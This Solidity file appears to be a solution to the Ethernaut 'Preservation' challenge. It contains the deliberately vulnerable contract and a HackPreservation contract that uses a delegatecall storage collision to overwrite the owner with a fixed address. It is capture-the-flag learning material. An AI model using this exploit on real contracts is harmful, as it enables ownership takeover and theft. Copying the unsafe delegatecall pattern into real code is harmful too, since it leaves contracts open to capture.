// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}

contract HackPreservation {
  address public foo;
  address public bar;
  address public owner;
  uint public baz;
  uint public hackAddress;
  address public constant myAddress = 0xe8366E50ed089Eea4df663116e257B5D79fbD953;
  Preservation public preservation = Preservation(0x9B463035F23D126d82f8f9d2A1D3A7510e493Ea4);

  // simple type conversion from address to uint256
  function setAddressToUint() public {
    hackAddress = uint256(uint160(address(this)));
  }

  /**
   * @dev assign hackAddress to timeZone1Library using delegatecall
   */
  function callSetFirstTime() public {
    preservation.setFirstTime(hackAddress);
  }

  /**
   * @dev must call this function from Preservation contract with delegatecall
   * note that function signature is identical with setTime function of LibraryContract
   */
  function setTime(uint _timeStamp) public {
    owner = myAddress;
  }
}